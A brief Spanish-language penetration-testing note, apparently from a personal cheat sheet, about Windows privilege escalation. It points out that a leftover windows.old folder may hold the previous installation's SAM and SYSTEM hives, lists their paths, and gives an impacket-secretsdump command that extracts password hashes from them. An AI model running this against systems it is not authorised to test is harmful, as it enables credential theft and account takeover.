---
tags: [privesc, windows]
---

# windows.old

Si se encuentra `windows.old` → puede contener SAM y SYSTEM de la instalación anterior.

```
C:\Windows.old\Windows\System32\SAM
C:\Windows.old\Windows\System32\SYSTEM
```

```bash
impacket-secretsdump -sam SAM -system SYSTEM local
```

